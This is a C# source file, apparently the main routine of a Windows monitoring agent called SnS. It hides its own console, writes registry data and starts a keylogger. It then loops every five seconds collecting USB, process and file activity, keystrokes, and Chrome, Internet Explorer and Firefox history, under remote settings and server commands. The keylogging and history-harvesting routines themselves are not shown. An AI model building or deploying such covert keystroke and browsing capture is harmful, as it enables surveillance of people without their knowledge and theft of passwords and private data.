using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Management;
using System.IO;
using SnS.Classes;
using System.Data.SQLite;
using System.Threading;
using SnS.Functions;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using SnS.Classes.Requests;

namespace SnS
{
    class MainFunction : settingsFile
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        static void Main()
        {
            # region Console Controller
            var handle = GetConsoleWindow();

            // Hide
            ShowWindow(handle, SW_HIDE);

            // Show
            ShowWindow(handle, SW_SHOW);

            #endregion

            #region Registry
            RegistryData.setRegistry();
            #endregion

            #region KeyLogger
            KeyLogger.initKeyLogger();
            #endregion

            #region Keep Alive
            //start the keep alive action
            //Functions.KeepAlive.keepApplicationAlive();
            #endregion

            #region Device and Privileges
            //get user privileges
            GlobalVariables.setPrivileges();
            //AlertController.showPrivileges(GlobalVariables.getPrivileges());

            //set device name
            GlobalVariables.setDeviceName(System.Environment.UserName);
            System.IO.Directory.CreateDirectory(@"C:\Users\" + GlobalVariables.getDeviceName() + @"\Desktop\WorkerData\");
            #endregion

            #region Settings
            if (System.Net.NetworkInformation.NetworkInterface.GetIsNetworkAvailable())
            {
                try
                {
                    SettingsRequest.getSettings();
                    ApplicationsRequest.getApplications();
                }
                catch (Exception ex)
                {
                    settingsFile.setTrue();
                    Console.WriteLine(ex);
                }
            }
            #endregion

            #region Email
            //EmailSender.sendEmail();
            #endregion

            #region File Permission
            string[] fileEntries = Directory.GetFiles(GlobalVariables.rootFolder);
            foreach (string fileName in fileEntries)
                FileController.setFilePermission(fileName);
            #endregion

            #region UserPanel

            SocialRequests.getContacts();
            Thread th = new Thread(showUserPanel);
            th.Start();

            #endregion

            #region Application
            while (true)
            {
                #region USB
                try
                {
                    //USB SEQUENCE
                    if (allowUSB == 1)
                    {
                        UsbHandler.UsbInit();
                        UsbHandler.showUSB();
                        FileController.saveUSB();
                    }
                }
                catch (Exception ex)
                { }
                #endregion

                #region Process
                try
                {
                    //PROCESS SEQUENCE
                    if (GlobalVariables.user.allow_process == 1)
                    {
                        Process[] apProcessList = Process.GetProcesses();
                        ProcessData.makeProcessArray(apProcessList.Length, apProcessList);
                        FileController.FileData();
                    }
                }
                catch (Exception ex)
                { }
                #endregion

                #region Files
                try
                {
                    //FILES SEQUENCE
                    if (GlobalVariables.user.allow_file == 1)
                    {
                        FileController.watcherInit();
                    }
                }
                catch (Exception ex)
                { }
                #endregion

                #region Keylogger
                try
                {
                    //KEYLOGGER SEQUENCE
                    if (GlobalVariables.user.allow_logger == 1)
                    {
                        FileController.saveLogger();
                    }
                }
                catch (Exception ex)
                { }
                #endregion

                #region Internet History
                try
                {
                    //HISTORY SEQUENCE
                    if (GlobalVariables.user.allow_history == 1)
                    {
                        GoogleChrome.getHistory();
                    }
                }
                catch (Exception ex)
                { }

                try
                {
                    if (allowHistory == 1)
                    {
                        InternetExplorer testx = new InternetExplorer();
                        testx.GetHistory();
                    }

                    //foreach (URL ur in testx.URLs)
                    //Console.WriteLine(ur.Url);
                }
                catch (Exception ex)
                { }

                try
                {
                    if (allowHistory == 1)
                    {
                        Firefox ff = new Firefox();
                        ff.GetHistory();
                    }
                    //foreach (URL ur in ff.URLs)
                    //    Console.WriteLine(ur.Url);
                }
                catch (Exception ex)
                { }

                #endregion

                #region Server Commands
                //if (System.Net.NetworkInformation.NetworkInterface.GetIsNetworkAvailable())
                //{
                try
                {
                    MessagesRequest.getMessages();
                    ShutdownRequest.getShutdown();

                }
                catch (Exception ex)
                { }
                //}

                #endregion

                //afiseza acum cat timp a fost ultima activitate de mouse/tastatura
                //Console.WriteLine(AlertController.GetLastInputTime());
                //if (AlertController.GetLastInputTime() >= 60)
                //    AlertController.showAlert();

                Thread.Sleep(5000);
            }
            #endregion
        }

        public static void showUserPanel()
        {
            GlobalVariables.userPanel = new Forms.UserForm();
            System.Windows.Forms.Application.Run((Form)GlobalVariables.userPanel);
            //GlobalVariables.userPanel.Show();
        }
    }
}
